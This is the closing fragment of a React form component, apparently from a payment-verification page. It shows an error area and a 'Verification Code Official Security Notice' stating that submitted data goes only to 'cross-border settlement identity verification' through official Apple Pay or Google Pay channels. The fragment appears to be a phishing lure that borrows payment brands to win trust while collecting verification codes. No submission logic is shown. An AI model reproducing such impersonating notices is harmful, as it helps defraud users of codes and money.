              <AlertCircle className="w-4 h-4 flex-shrink-0" />
              {error}
            </div>
          )}

          {/* Security Notice */}
          <div className="bg-white border border-blue-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="bg-[#0A2B5E] px-5 py-3 flex items-center gap-2">
              <Shield className="w-4 h-4 text-blue-200 flex-shrink-0" />
              <span className="text-white text-xs font-semibold tracking-wide uppercase">Verification Code Official Security Notice</span>
            </div>
            <div className="px-5 py-4 flex items-start gap-3">
              <Lock className="w-5 h-5 text-[#1E3A8A] flex-shrink-0 mt-0.5" />
              <div className="space-y-1.5">
                <p className="text-sm text-[#0A2B5E] font-medium">Data Protection Statement</p>
                <p className="text-xs text-gray-600 leading-relaxed">The information you submit is used solely for the purpose of cross-border settlement identity verification. All settlement authentication and review materials are processed through the official secure channels of Apple Pay or Google Pay.</p>
              </div>
            </div>
          </div>
        </form>
      </main>

      <Footer />
    </div>
  );
}
